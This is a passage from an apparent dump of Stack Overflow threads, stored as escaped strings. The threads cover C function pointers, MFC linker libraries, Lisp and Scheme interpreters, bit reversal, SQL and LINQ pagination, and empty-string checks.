parentheses) for this:\\n\\nfunc(print);\\n\\n\\nwould call func, passing the print function to it.\\n\\nFunction Body\\n\\nAs with any parameter, func can now use the parameter\\'s name in the function body to access the value of the parameter. Let\\'s say that func will apply the function it is passed to the numbers 0-4. Consider, first, what the loop would look like to call print directly:\\n\\nfor ( int ctr = 0 ; ctr &lt; 5 ; ctr++ ) {\\n  print(ctr);\\n}\\n\\n\\nSince func\\'s parameter declaration says that f is the name for a pointer to the desired function, we recall first that if f is a pointer then *f is the thing that f points to (i.e. the function print in this case). As a result, just replace every occurrence of print in the loop above with *f:\\n\\nvoid func ( void (*f)(int) ) {\\n  for ( int ctr = 0 ; ctr &lt; 5 ; ctr++ ) {\\n    (*f)(ctr);\\n  }\\n}\\n\\n\\nFrom http://math.hws.edu/bridgeman/courses/331/f05/handouts/c-c++-notes.html\\n', \"This question already has the answer for defining function pointers, however they can get very messy, especially if you are going to be passing them around your application. To avoid this unpleasantness I would recommend that you typedef the function pointer into something more readable. For example.\\n\\ntypedef void (*functiontype)();\\n\\n\\nDeclares a function that returns void and takes no arguments. To create a function pointer to this type you can now do:\\n\\nvoid dosomething() { }\\n\\nfunctiontype func = &amp;dosomething;\\nfunc();\\n\\n\\nFor a function that returns an int and takes a char you would do\\n\\ntypedef int (*functiontype2)(char);\\n\\n\\nand to use it\\n\\nint dosomethingwithchar(char a) { return 1; }\\n\\nfunctiontype2 func2 = &amp;dosomethingwithchar\\nint result = func2('a');\\n\\n\\nThere are libraries that can help with turning function pointers into nice readable types. The boost function library is great and is well worth the effort!\\n\\nboost::function&lt;int (char a)&gt; functiontype2;\\n\\n\\nis so much nicer than the above.\\n\", 'Since C++11 you can use the following the functional library to do this in a succinct and generic fashion. The syntax is, e.g.,\\n\\nstd::function&lt;bool (int)&gt;\\n\\n\\nwhere bool is the return type here of a one-argument function whose first argument is of type int.\\n\\nI have included an example program below:\\n\\n// g++ test.cpp --std=c++11\\n#include &lt;functional&gt;\\n\\ndouble Combiner(double a, double b, std::function&lt;double (double,double)&gt; func){\\n  return func(a,b);\\n}\\n\\ndouble Add(double a, double b){\\n  return a+b;\\n}\\n\\ndouble Mult(double a, double b){\\n  return a*b;\\n}\\n\\nint main(){\\n  Combiner(12,13,Add);\\n  Combiner(12,13,Mult);\\n}\\n\\n', 'Pass address of a function as parameter to another function as shown below\\n\\n#include &lt;stdio.h&gt;\\n\\nvoid print();\\nvoid execute(void());\\n\\nint main()\\n{\\n    execute(print); // sends address of print\\n    return 0;\\n}\\n\\nvoid print()\\n{\\n    printf(\"Hello!\");\\n}\\n\\nvoid execute(void f()) // receive address of print\\n{\\n    f();\\n}\\n\\n\\nAlso we can pass function as parameter using function pointer\\n\\n#include &lt;stdio.h&gt;\\n\\nvoid print();\\nvoid execute(void (*f)());\\n\\nint main()\\n{\\n    execute(&amp;print); // sends address of print\\n    return 0;\\n}\\n\\nvoid print()\\n{\\n    printf(\"Hello!\");\\n}\\n\\nvoid execute(void (*f)()) // receive address of print\\n{\\n    f();\\n}\\n\\n'], ['I\\'m integrating .NET support into our C++ application.\\nIt\\'s an old-school MFC application, with 1 extra file compiled with the \"/clr\" option that references a CWinFormsControl.\\n\\nI\\'m not allowed to remove the linker flag \"/NODEFAULTLIB\".\\n(We have our own build management system, not Visual Studio\\'s.)\\nThis means I have to specify all necessary libraries: VC runtime and MFC.\\n\\nOther compiler options include \"/MD\"\\n\\nNext to that: I can\\'t use the linker flag \"/FORCE:MULTIPLE\" and just add everything:\\nI\\'m looking for a non-overlapping set of libraries.\\n', 'As a bare minimum:\\n\\nmscoree.lib\\nMSVCRT.lib\\nmfc90.lib (adjust version appropriately)\\n\\nAnd iterate from there.\\n', 'Use the AppWizard to create a bare-bones MFC app in your style (SDI / MDI / dialog ) and then put on your depends.\\n', 'How I solved it: \\n\\n\\nlink with \"/FORCE:MULTIPLE /verbose\" (that links ok) and set the output aside.\\nlink with \"/NODEFAULTIB /verbose\" and trace all unresolveds in the output of the previous step and add the libraries 1 by 1. \\nThis resulted in doubles: \"AAA.lib: XXX already defined in BBB.lib\"\\nThen I finally got it:\\nRecompiled managed AND unmanaged units with /MD\\nand link to (among others):\\nmscoree.lib\\nmsvcmrt.lib\\nmfcm80d.lib\\n\\n\\nMixing /MT (unmanaged) and /MD (managed) turned out to be the bad idea: \\ndifferent(overlapping) libraries are needed.\\n\\n@ajryan: Dependcy Walker only tells me what dll\\'s are used, not what libraries are linked to when linking.\\n(e.g. msvcmrt.lib ?)\\nI think.\\n\\nThanks for the answers!\\n\\nJan\\n'], [\"\\nI've been wanting to teach myself Lisp for a while.  However, all the interpreters of which I've heard involve some flavor of emacs.\\nAre there any command line interpreters, such that I could type this into the command line:\\n\\n\\n  lispinterpret sourcefile.lisp\\n\\n\\njust like I can run perl or python.\\n\\nWhile I'd also like to become more familiar with Emacs (if only not to be frustrated when I work with somebody who uses Emacs), I'd rather decouple learning Emacs from learning Lisp.\\n\\nEdit: I actually want to follow SICP which uses Scheme, so an answer about Scheme would be more useful.  I'm just not that familiar with the differences.\\n\", 'Checkout CLISP wiki-link that ie. was used by Paul Graham\\n\\nDirect link\\n', 'Did you try Allegro CL from http://www.franz.com/?\\n', \"You could also try DrScheme, which whilst not exactly a standalone interpreter, isn't emacs :)\\n\\nIt's basically a simple IDE that has an area to type in code that can be executed as a file, and then another area that is the running interpreter that you can interact with.\\n\\n(Also, find the UC Berkeley CS61A podcasts and listen to them, as well as reading SICP)\\n\", 'It looks like Steel Bank Common Lisp (SBCL) also caters to what you want:\\n\\nhttp://www.sbcl.org/manual/Shebang-Scripts.html#Shebang-Scripts\\n\\nSBCL is both top rate and open source.\\n', \"@Nathan: I've upmodded the Common Lisp links, because you asked about Lisp (especially with reference to Emacs Lisp). However, Common Lisp is very different from Scheme. A program written for one is unlikely to run on the other.\\n\\nAs you mentioned, SICP is for learning Scheme, not Lisp (or at least, not Common Lisp and not Emacs Lisp). There are some overlap in principles, however you can't simply cut and paste code from SICP and expect it to run on any Common Lisp or Emacs Lisp system. :-)\\n\", 'Another good dialect of lisp is cmucl.  They used to love to brag about being the \"fastest\" lisp.\\n', \"The most widely used IDE for Common Lisp, particularly in the free software subset of the community, is in fact SLIME, which runs on Emacs. You can use whatever CL compiler you prefer and invoke Lisp source files the way you describe, but if you do that, you won't be taking advantage of many of Lisps dynamic features that are so incredibly useful while developing your application.\\n\\nI suggest you take a look at this SLIME demonstration video to see what I mean, even though it might be a bit outdated at this point.\\n\\nIf the problem is that you (think you) don't like Emacs, I seriously suggest you try to learn it. Seriously. No, really, I mean that. However, there are alternatives, such as the IDEs provided by commercial Lisp implementations such as Allegro and Lispworks (free trials available), or an Eclipse plug-in called Cusp. \\n\", 'I often write lisp shell scripts which start with this line:\\n\\n#!/usr/bin/clisp\\n\\nThen you don\\'t even need to type \"lispinterpret\" on the command-line.  Just mark the script executable and run it directly.\\n', 'No \"interpreter\" requires emacs. \\n\\nAlso, emacs can run elisp in a headless manner.\\n', 'If you are looking for Scheme to work with the SICP, take a look at MIT/GNU Scheme\\n\\nhttp://groups.csail.mit.edu/mac/projects/scheme/\\n\\nhttp://www.gnu.org/software/mit-scheme/index.html\\n', 'It seems like scheme shell is suitable for your purpose.\\nTake a look at http://www.scsh.net/index.html\\n', \"Most scheme interpreters that I am familiar with can be run from the command line.  (Much of the list below is extracted from the comparative table at Alexey Radul's Scheme Implementation Choices page.  There is a more extensive list at schemewiki but that page does not immediately provide command-line invocation syntax.)\\n\\nHere's how you run a number of implementations at the command line:\\n\\n\\nChez Scheme: scheme, petite\\nMIT Scheme: mit-scheme\\nScheme 48: scheme48\\nRScheme: rs\\nRacket: racket (But I recommend trying the DrRacket IDE, especially for beginners.)\\nGuile: guile\\nBigloo: bigloo\\nChicken: csi\\nGambit: gsi\\nGauche: gosh\\nIronScheme: IronScheme.Console\\nKawa: kawa, java kawa.repl\\nLarceny: larceny\\nSCM: scm\\n\\n\"], ['I was reading Joel\\'s book where he was suggesting as interview question:\\n\\n\\n  Write a program to reverse the \"ON\" bits in a given byte.\\n\\n\\nI only can think of a solution using C. \\n\\nAsking here so you can show me how to do in a Non C way (if possible)\\n', \"What specifically does that question mean?\\n\\nDoes reverse mean setting 1's to 0's and vice versa?\\n\\nOr does it mean 00001100 --> 00110000 where you reverse their order in the byte? Or perhaps just reversing the part that is from the first 1 to the last 1? ie. 00110101 --> 00101011?\\n\\nAssuming it means reversing the bit order in the whole byte, here's an x86 assembler version:\\n\\n; al is input register\\n; bl is output register\\n\\nxor bl, bl      ; clear output\\n\\n; first bit\\nrcl al, 1       ; rotate al through carry\\nrcr bl, 1       ; rotate carry into bl\\n\\n; duplicate above 2-line statements 7 more times for the other bits\\n\\n\\nnot the most optimal solution, a table lookup is faster.\\n\", \"Reversing the order of bits in C#:\\n\\nbyte ReverseByte(byte b)\\n{\\n    byte r = 0;\\n    for(int i=0; i&lt;8; i++)\\n    {\\n        int mask = 1 &lt;&lt; i;\\n        int bit = (b &amp; mask) &gt;&gt; i;\\n        int reversedMask = bit &lt;&lt; (7 - i);\\n        r |= (byte)reversedMask;\\n    }\\n    return r;\\n}\\n\\n\\nI'm sure there are more clever ways of doing it but in that precise case, the interview question is meant to determine if you know bitwise operations so I guess this solution would work.\\n\\nIn an interview, the interviewer usually wants to know how you find a solution, what are you problem solving skills, if it's clean or if it's a hack. So don't come up with too much of a clever solution because that will probably mean you found it somewhere on the Internet beforehand. Don't try to fake that you don't know it neither and that you just come up with the answer because you are a genius, this is will be even worst if she figures out since you are basically lying.\\n\", \"The classic Bit Hacks page has several (really very clever) ways to do this, but it's all in C. Any language derived from C syntax (notably Java) will likely have similar methods. I'm sure we'll get some Haskell versions in this thread ;)\\n\", \"\\n  byte ReverseByte(byte b)\\n  {\\n      return b ^ 0xff;\\n  }\\n\\n\\nThat works if ^ is XOR in your language, but not if it's AND, which it often is.\\n\", '\\n  What specifically does that question mean?\\n\\n\\nGood question.  If reversing the \"ON\" bits means reversing only the bits that are \"ON\", then you will always get 0, no matter what the input is.  If it means reversing all the bits, i.e. changing all 1s to 0s and all 0s to 1s, which is how I initially read it, then that\\'s just a bitwise NOT, or complement.  C-based languages have a complement operator, ~, that does this.  For example:\\n\\nunsigned char b = 102;      /* 0x66, 01100110 */\\nunsigned char reverse = ~b; /* 0x99, 10011001 */\\n\\n', 'If you\\'re talking about switching 1\\'s to 0\\'s and 0\\'s to 1\\'s, using Ruby:\\n\\nn = 0b11001100\\n~n\\n\\n\\nIf you mean reverse the order:\\n\\nn = 0b11001100\\neval(\"0b\" + n.to_s(2).reverse)\\n\\n\\nIf you mean counting the on bits, as mentioned by another user:\\n\\nn = 123\\ncount = 0\\n0.upto(8) { |i| count = count + n[i] }\\n\\n\\n\\x99 Ruby\\n', 'I\\'m probably misremembering, but I thought that Joel\\'s question was about counting the \"on\" bits rather than reversing them.\\n', \"Since the question asked for a non-C way, here's a Scheme implementation, cheerfully plagiarised from SLIB:\\n\\n(define (bit-reverse k n)\\n  (do ((m (if (negative? n) (lognot n) n) (arithmetic-shift m -1))\\n       (k (+ -1 k) (+ -1 k))\\n       (rvs 0 (logior (arithmetic-shift rvs 1) (logand 1 m))))\\n      ((negative? k) (if (negative? n) (lognot rvs) rvs))))\\n\\n(define (reverse-bit-field n start end)\\n  (define width (- end start))\\n  (let ((mask (lognot (ash -1 width))))\\n    (define zn (logand mask (arithmetic-shift n (- start))))\\n    (logior (arithmetic-shift (bit-reverse width zn) start)\\n            (logand (lognot (ash mask start)) n))))\\n\\n\\nRewritten as C (for people unfamiliar with Scheme), it'd look something like this (with the understanding that in Scheme, numbers can be arbitrarily big):\\n\\nint\\nbit_reverse(int k, int n)\\n{\\n    int m = n &lt; 0 ? ~n : n;\\n    int rvs = 0;\\n    while (--k &gt;= 0) {\\n        rvs = (rvs &lt;&lt; 1) | (m &amp; 1);\\n        m &gt;&gt;= 1;\\n    }\\n    return n &lt; 0 ? ~rvs : rvs;\\n}\\n\\nint\\nreverse_bit_field(int n, int start, int end)\\n{\\n    int width = end - start;\\n    int mask = ~(-1 &lt;&lt; width);\\n    int zn = mask &amp; (n &gt;&gt; start);\\n    return (bit_reverse(width, zn) &lt;&lt; start) | (~(mask &lt;&lt; start) &amp; n);\\n}\\n\\n\", \"And here's a version directly cut and pasted from OpenJDK, which is interesting because it involves no loop. On the other hand, unlike the Scheme version I posted, this version only works for 32-bit and 64-bit numbers. :-)\\n\\n32-bit version:\\n\\npublic static int reverse(int i) {\\n    // HD, Figure 7-1\\n    i = (i &amp; 0x55555555) &lt;&lt; 1 | (i &gt;&gt;&gt; 1) &amp; 0x55555555;\\n    i = (i &amp; 0x33333333) &lt;&lt; 2 | (i &gt;&gt;&gt; 2) &amp; 0x33333333;\\n    i = (i &amp; 0x0f0f0f0f) &lt;&lt; 4 | (i &gt;&gt;&gt; 4) &amp; 0x0f0f0f0f;\\n    i = (i &lt;&lt; 24) | ((i &amp; 0xff00) &lt;&lt; 8) |\\n        ((i &gt;&gt;&gt; 8) &amp; 0xff00) | (i &gt;&gt;&gt; 24);\\n    return i;\\n}\\n\\n\\n64-bit version:\\n\\npublic static long reverse(long i) {\\n    // HD, Figure 7-1\\n    i = (i &amp; 0x5555555555555555L) &lt;&lt; 1 | (i &gt;&gt;&gt; 1) &amp; 0x5555555555555555L;\\n    i = (i &amp; 0x3333333333333333L) &lt;&lt; 2 | (i &gt;&gt;&gt; 2) &amp; 0x3333333333333333L;\\n    i = (i &amp; 0x0f0f0f0f0f0f0f0fL) &lt;&lt; 4 | (i &gt;&gt;&gt; 4) &amp; 0x0f0f0f0f0f0f0f0fL;\\n    i = (i &amp; 0x00ff00ff00ff00ffL) &lt;&lt; 8 | (i &gt;&gt;&gt; 8) &amp; 0x00ff00ff00ff00ffL;\\n    i = (i &lt;&lt; 48) | ((i &amp; 0xffff0000L) &lt;&lt; 16) |\\n        ((i &gt;&gt;&gt; 16) &amp; 0xffff0000L) | (i &gt;&gt;&gt; 48);\\n    return i;\\n}\\n\\n\", '\\n  I\\'m probably misremembering, but I\\n  thought that Joel\\'s question was about\\n  counting the \"on\" bits rather than\\n  reversing them.\\n\\n\\nHere you go:\\n\\n#include &lt;stdio.h&gt;\\n\\nint countBits(unsigned char byte);\\n\\nint main(){\\n  FILE* out = fopen( \"bitcount.c\" ,\"w\");\\n\\n  int i;\\n  fprintf(out, \"#include &lt;stdio.h&gt;\\\\n#include &lt;stdlib.h&gt;\\\\n#include &lt;time.h&gt;\\\\n\\\\n\");\\n\\n  fprintf(out, \"int bitcount[256] = {\");\\n  for(i=0;i&lt;256;i++){\\n    fprintf(out, \"%i\", countBits((unsigned char)i));\\n    if( i &lt; 255 ) fprintf(out, \", \");\\n  }\\n  fprintf(out, \"};\\\\n\\\\n\");\\n\\n  fprintf(out, \"int main(){\\\\n\");\\n\\n  fprintf(out, \"srand ( time(NULL) );\\\\n\");\\n  fprintf(out, \"\\\\tint num = rand() %% 256;\\\\n\");\\n  fprintf(out, \"\\\\tprintf(\\\\\"The byte %%i has %%i bits set to ON.\\\\\\\\n\\\\\", num, bitcount[num]);\\\\n\");\\n\\n  fprintf(out, \"\\\\treturn 0;\\\\n\");\\n  fprintf(out, \"}\\\\n\");\\n  fclose(out);\\n\\n  return 0;\\n}\\n\\nint countBits(unsigned char byte){\\n  unsigned char mask = 1;\\n  int count = 0;\\n  while(mask){\\n    if( mask&amp;byte ) count++;\\n    mask &lt;&lt;= 1;\\n  }\\n  return count;\\n}\\n\\n', 'Here\\'s the obligatory Haskell soln for complementing the bits, it uses the library function, complement:\\n\\nimport Data.Bits\\nimport Data.Int\\n\\ni = 123::Int\\ni32 = 123::Int32\\ni64 = 123::Int64\\nvar2 = 123::Integer\\n\\ntest1 = sho i\\ntest2 = sho i32\\ntest3 = sho i64\\ntest4 = sho var2 -- Exception\\n\\nsho i = putStrLn $ showBits i ++ \"\\\\n\" ++ (showBits $complement i)\\nshowBits  v = concatMap f (showBits2 v) where\\n   f False = \"0\"\\n   f True  = \"1\"\\nshowBits2 v = map (testBit v) [0..(bitSize v - 1)]\\n\\n', \"I'd modify palmsey's second example, eliminating a bug and eliminating the eval:\\n\\nn = 0b11001100\\nn.to_s(2).rjust(8, '0').reverse.to_i(2)\\n\\n\\nThe rjust is important if the number to be bitwise-reversed is a fixed-length bit field -- without it, the reverse of 0b00101010 would be 0b10101 rather than the correct 0b01010100.  (Obviously, the 8 should be replaced with the length in question.)  I just got tripped up by this one.\\n\", \"If the question means to flip all the bits, and you aren't allowed to use C-like operators such as XOR and NOT, then this will work:\\n\\nbFlipped = -1 - bInput;\\n\\n\", 'I claim trick question. :) Reversing all bits means a flip-flop, but only the bits that are on clearly means:\\n\\nreturn 0;\\n\\n', 'pseudo code..\\n\\nwhile (Read())\\n  Write(0);\\n\\n', '\\n  Asking here so you can show me how to do in a Non C way (if possible)\\n\\n\\nSay you have the number 10101010. To change 1s to 0s (and vice versa) you just use XOR:\\n\\n 10101010\\n^11111111\\n --------\\n 01010101\\n\\n\\nDoing it by hand is about as \"Non C\" as you\\'ll get.\\n\\nHowever from the wording of the question it really sounds like it\\'s only turning off \"ON\" bits... In which case the answer is zero (as has already been mentioned) (unless of course the question is actually asking to swap the order of the bits).\\n', 'Reversing the bits.\\nFor example we have a number represented by 01101011 . Now if we reverse the bits then this number will become 11010110. Now to achieve this you should first know how to do swap two bits in a number.\\nSwapping two bits in a  number:-\\nXOR both the bits with one and see if results are different. If they are not then both the bits are same otherwise XOR both the bits with XOR and save it in its original number;\\nNow for reversing the number \\nFOR I less than Numberofbits/2\\n   swap(Number,I,NumberOfBits-1-I);\\n'], [\"Many applications have grids that display data from a database table one page at a time. Many of them also let the user pick the number of records per page, sort by any column, and navigate back and forth through the results.\\n\\nWhat's a good algorithm to implement this pattern without bringing the entire table to the client and then filtering the data on the client. How do you bring just the records you want to display to the user?\\n\\nDoes LINQ simplify the solution?\\n\", 'On MS SQL Server 2005 and above, ROW_NUMBER() seems to work:\\n\\nT-SQL: Paging with ROW_NUMBER()\\n\\nDECLARE @PageNum AS INT;\\nDECLARE @PageSize AS INT;\\nSET @PageNum = 2;\\nSET @PageSize = 10;\\n\\nWITH OrdersRN AS\\n(\\n    SELECT ROW_NUMBER() OVER(ORDER BY OrderDate, OrderID) AS RowNum\\n          ,OrderID\\n          ,OrderDate\\n          ,CustomerID\\n          ,EmployeeID\\n      FROM dbo.Orders\\n)\\n\\nSELECT * \\n  FROM OrdersRN\\n WHERE RowNum BETWEEN (@PageNum - 1) * @PageSize + 1 \\n                  AND @PageNum * @PageSize\\n ORDER BY OrderDate\\n         ,OrderID;\\n\\n', 'Actually, LINQ has Skip and Take methods which can be combined to choose which records are fetched.\\n\\nCheck those out.\\n\\nFor DB: Pagination In SQL Server 2005\\n', 'Oracle Solution:\\n\\nselect * from (\\n    select a.*, rownum rnum from (\\n        YOUR_QUERY_GOES_HERE -- including the order by\\n    ) a\\n    where rownum &lt;= MAX_ROW\\n ) where rnum &gt;= MIN_ROW\\n\\n', \"I'd recommend either using LINQ, or try to copy what it does. I've got an app where I use the LINQ Take and Skip methods to retrieve paged data. The code looks something like this:\\n\\nMyDataContext db = new MyDataContext();\\nvar results = db.Products\\n    .Skip((pageNumber - 1) * pageSize)\\n    .Take(pageSize);\\n\\n\\nRunning SQL Server Profiler reveals that LINQ is converting this query into SQL similar to:\\n\\nSELECT [ProductId], [Name], [Cost], and so on...\\nFROM (\\n    SELECT [ProductId], [Name], [Cost], [ROW_NUMBER]\\n    FROM (\\n       SELECT ROW_NUMBER() OVER (ORDER BY [Name]) AS [ROW_NUMBER], \\n           [ProductId], [Name], [Cost]\\n       FROM [Products]\\n    )\\n    WHERE [ROW_NUMBER] BETWEEN 10 AND 20\\n)\\nORDER BY [ROW_NUMBER]\\n\\n\\nIn plain English:\\n1. Filter your rows and use the ROW_NUMBER function to add row numbers in the order you want.\\n2. Filter (1) to return only the row numbers you want on your page.\\n3. Sort (2) by the row number, which is the same as the order you wanted (in this case, by Name).\\n\", \"There are a few solutions which I use with MS SQL 2005.\\n\\nOne of them is ROWNUMBER(). But, personally, I don't like ROWNUMBER() because it doesn't work for big results (DB which I work on is really big -- over 1TB data running thousands of queries in second -- you know -- big social networking site).\\n\\nHere are my favourite solution.\\n\\nI will use kind of pseudo code of T-SQL.\\n\\nLet's find 2nd page of users sorted by forename, surname, where each page has 10 records.\\n\\n@page = 2 -- input parameter\\n@size = 10 -- can be optional input parameter\\n\\nif @page &lt; 1 then begin\\n    @page = 1 -- check page number\\nend\\n@start = (@page-1) * @size + 1 -- @page starts at record no @start\\n\\n-- find the beginning of page @page\\nSELECT TOP (@start)\\n    @forename = forename,\\n    @surname = surname\\n    @id = id\\nFROM\\n    users\\nORDER BY\\n    forename,\\n    surname,\\n    id -- to keep correct order in case of have two John Smith.\\n\\n-- select @size records starting from @start\\nSELECT TOP (@size)\\n    id,\\n    forename,\\n    surname\\nFROM\\n    users\\nWHERE\\n    (forename = @forename and surname = @surname and id &gt;= @id) -- the same name and surname, but bigger id\\n    OR (forename = @forename and surname &gt; @surname) -- the same name, but bigger surname, id doesn't matter\\n    OR (forename &gt; @forename) -- bigger forename, the rest doesn't matter\\nORDER BY\\n    forename,\\n    surname,\\n    id\\n\\n\", \"LINQ combined with lambda expressions and anonymous classes in .Net 3.5 hugely simplifies this sort of thing.\\n\\nQuerying the database:\\n\\nvar customers = from c in db.customers\\n                join p in db.purchases on c.CustomerID equals p.CustomerID\\n                where p.purchases &gt; 5\\n                select c;\\n\\n\\nNumber of records per page:\\n\\ncustomers = customers.Skip(pageNum * pageSize).Take(pageSize);\\n\\n\\nSorting by any column:\\n\\ncustomers = customers.OrderBy(c =&gt; c.LastName);\\n\\n\\nGetting only selected fields from server:\\n\\nvar customers = from c in db.customers\\n                join p in db.purchases on c.CustomerID equals p.CustomerID\\n                where p.purchases &gt; 5\\n                select new\\n                {\\n                    CustomerID = c.CustomerID,\\n                    FirstName = c.FirstName,\\n                    LastName = c.LastName\\n                };\\n\\n\\nThis creates a statically-typed anonymous class in which you can access its properties:\\n\\nvar firstCustomer = customer.First();\\nint id = firstCustomer.CustomerID;\\n\\n\\nResults from queries are lazy-loaded by default, so you aren't talking to the database until you actually need the data. LINQ in .Net also greatly simplifies updates by keeping a datacontext of any changes you have made, and only updating the fields which you change.\\n\", 'There is a discussion about this Here\\n\\nThe technique gets page number 100,000 from a 150,000 line database in 78ms\\n\\n\\n  Using optimizer knowledge and SET ROWCOUNT, the first EmployeeID in the page that is requested is stored in a local variable for a starting point. Next, SET ROWCOUNT to the maximum number of records that is requested in @maximumRows. This allows paging the result set in a much more efficient manner. Using this method also takes advantage of pre-existing indexes on the table as it goes directly to the base table and not to a locally created table. \\n\\n\\nI am afraid I am not able to judge if it is better than the current accepted answer.\\n', 'There are essentially two ways of doing pagination in the database (I\\'m assuming you\\'re using SQL Server):\\n\\nUsing OFFSET\\n\\nOthers have explained how the ROW_NUMBER() OVER() ranking function can be used to perform pages. It\\'s worth mentioning that SQL Server 2012 finally included support for the SQL standard OFFSET .. FETCH clause:\\n\\nSELECT first_name, last_name, score\\nFROM players\\nORDER BY score DESC\\nOFFSET 40 ROWS FETCH NEXT 10 ROWS ONLY\\n\\n\\nIf you\\'re using SQL Server 2012 and backwards-compatibility is not an issue, you should probably prefer this clause as it will be executed more optimally by SQL Server in corner cases.\\n\\nUsing the SEEK Method\\n\\nThere is an entirely different, much faster, but less known way to perform paging in SQL. This is often called the \"seek method\" as described in this blog post here.\\n\\nSELECT TOP 10 first_name, last_name, score\\nFROM players\\nWHERE (score &lt; @previousScore)\\n   OR (score = @previousScore AND player_id &lt; @previousPlayerId)\\nORDER BY score DESC, player_id DESC\\n\\n\\nThe @previousScore and @previousPlayerId values are the respective values of the last record from the previous page. This allows you to fetch the \"next\" page. If the ORDER BY direction is ASC, simply use &gt; instead.\\n\\nWith the above method, you cannot immediately jump to page 4 without having first fetched the previous 40 records. But often, you do not want to jump that far anyway. Instead, you get a much faster query that might be able to fetch data in constant time, depending on your indexing. Plus, your pages remain \"stable\", no matter if the underlying data changes (e.g. on page 1, while you\\'re on page 4).\\n\\nThis is the best way to implement paging when lazy loading more data in web applications, for instance.\\n\\nNote, the \"seek method\" is also called keyset paging.\\n'], ['Which is more efficient for the compiler and the best practice for checking whether a string is blank? \\n\\n\\nChecking whether the length of the string == 0\\nChecking whether the string is empty (strVar == \"\")\\n\\n\\nAlso, does the answer depend on language?\\n', 'Yes, it depends on language, since string storage differs between languages.\\n\\n\\nPascal-type strings: Length = 0.\\nC-style strings: [0] == 0. \\n.NET: .IsNullOrEmpty.\\n\\n\\nEtc. \\n', 'In .Net:\\n\\nstring.IsNullOrEmpty( nystr );\\n\\n\\nstrings can be null, so .Length sometimes throws a NullReferenceException\\n', 'Actually, IMO the best way to determine is the IsNullOrEmpty() method of the string class.\\n\\nhttp://msdn.microsoft.com/en-us/library/system.string.isnullorempty.\\n\\nUpdate: I assumed .Net, in other languages, this might be different.\\n', 'In languages that use C-style (null-terminated) strings, comparing to \"\" will be faster.  That\\'s an O(1) operation, while taking the length of a C-style string is O(n).\\n\\nIn languages that store length as part of the string object (C#, Java, ...) checking the length is also O(1).  In this case, directly checking the length is faster, because it avoids the overhead of constructing the new empty string.\\n', 'In Java 1.6, the String class has a new method isEmpty \\n\\nThere is also the Jakarta commons library, which has the isBlank method. Blank is defined as a string that contains only whitespace.\\n', '\\n  In this case, directly checking the length is faster, because it avoids the overhead of constructing the new empty string.\\n\\n\\n@DerekPark: That\\'s not always true. \"\" is a string literal so, in Java, it will almost certainly already be interned.\\n', 'For C strings,\\n\\nif (s[0] == 0)\\n\\n\\nwill be faster than either\\n\\nif (strlen(s) == 0)\\n\\n\\nor\\n\\nif (strcmp(s, \"\") == 0)\\n\\n\\nbecause you will avoid the overhead of a function call.\\n', '\\n  In languages that use C-style (null-terminated) strings, comparing to \"\" will be faster\\n\\n\\nActually, it may be better to check if the first char in the string is \\'\\\\0\\':\\n\\nchar *mystring;\\n/* do something with the string */\\nif ((mystring != NULL) &amp;&amp; (mystring[0] == \\'\\\\0\\')) {\\n    /* the string is empty */\\n}\\n\\n\\nIn Perl there\\'s a third option, that the string is undefined.  This is a bit different from a NULL pointer in C, if only because you don\\'t get a segmentation fault for accessing an undefined string. \\n', \"@Nathan\\n\\n\\n  Actually, it may be better to check if the first char in the string is '\\\\0':\\n\\n\\nI almost mentioned that, but ended up leaving it out, since calling strcmp() with the empty string and directly checking the first character in the string are both O(1).  You basically just pay for an extra function call, which is pretty cheap.  If you really need the absolute best speed, though, definitely go with a direct first-char-to-0 comparison.\\n\\nHonestly, I always use strlen() == 0, because I have never written a program where this was actually a measurable performance issue, and I think that's the most readable way to express the check.\\n\", 'String.IsNullOrEmpty() only works on .net 2.0 and above, for .net 1/1.1, I tend to use:\\n\\nif (inputString == null || inputString == String.Empty)\\n{\\n    // String is null or empty, do something clever here. Or just expload.\\n}\\n\\n\\nI use String.Empty as opposed to \"\" because \"\" will create an object, whereas String.Empty wont - I know its something small and trivial, but id still rather not create objects when I dont need them! (Source)\\n', \"Again, without knowing the language, it's impossible to tell.\\n\\nHowever, I recommend that you choose the technique that makes the most sense to the maintenance programmer that follows and will have to maintain your work.\\n\\nI'd recommend writing a function that explicitly does what you want, such as\\n\\n#define IS_EMPTY(s) ((s)[0]==0)\\n\\n\\nor comparable.  Now there's no doubt at is you're checking.\\n\", 'Assuming your question is .NET:\\n\\nIf you want to validate your string against nullity as well use IsNullOrEmpty, if you know already that your string is not null, for example when checking TextBox.Text etc., do not use IsNullOrEmpty, and then comes in your question.\\nSo for my opinion String.Length is less perfomance than string comparison.\\n\\nI event tested it (I also tested with C#, same result):\\n\\nModule Module1\\n  Sub Main()\\n    Dim myString = \"\"\\n\\n\\n    Dim a, b, c, d As Long\\n\\n    Console.WriteLine(\"Way 1...\")\\n\\n    a = Now.Ticks\\n    For index = 0 To 10000000\\n      Dim isEmpty = myString = \"\"\\n    Next\\n    b = Now.Ticks\\n\\n    Console.WriteLine(\"Way 2...\")\\n\\n    c = Now.Ticks\\n    For index = 0 To 10000000\\n      Dim isEmpty = myString.Length = 0\\n    Next\\n    d = Now.Ticks\\n\\n    Dim way1 = b - a, way2 = d - c\\n\\n    Console.WriteLine(\"way 1 took {0} ticks\", way1)\\n    Console.WriteLine(\"way 2 took {0} ticks\", way2)\\n    Console.WriteLine(\"way 1 took {0} ticks more than way 2\", way1 - way2)\\n    Console.Read()\\n  End Sub\\nEnd Module\\n\\n\\nResult:\\n\\nWay 1...\\nWay 2...\\nway 1 took 624001 ticks\\nway 2 took 468001 ticks\\nway 1 took 156000 ticks more than way 2\\n\\n\\nWhich means comparison takes way more than string length check.\\n', 'After I read this thread, I conducted a little experiment, which yielded two distinct, and interesting, findings.\\n\\nConsider the following.\\n\\nstrInstallString    \"1\" string\\n\\n\\nThe above is copied from the locals window of the Visual Studio debugger. The same value is used in all three of the following examples.\\n\\nif ( strInstallString == \"\" ) === if ( strInstallString == string.Empty )\\n\\nFollowing is the code displayed in the disassembly window of the Visual Studio 2013 debugger for these two fundamentally identical cases.\\n\\nif ( strInstallString == \"\" )\\n003126FB  mov         edx,dword ptr ds:[31B2184h]\\n00312701  mov         ecx,dword ptr [ebp-50h]\\n00312704  call        59DEC0B0            ; On return, EAX = 0x00000000.\\n00312709  mov         dword ptr [ebp-9Ch],eax\\n0031270F  cmp         dword ptr [ebp-9Ch],0\\n00312716  sete        al\\n00312719  movzx       eax,al\\n0031271C  mov         dword ptr [ebp-64h],eax\\n0031271F  cmp         dword ptr [ebp-64h],0\\n00312723  jne         00312750\\n\\nif ( strInstallString == string.Empty 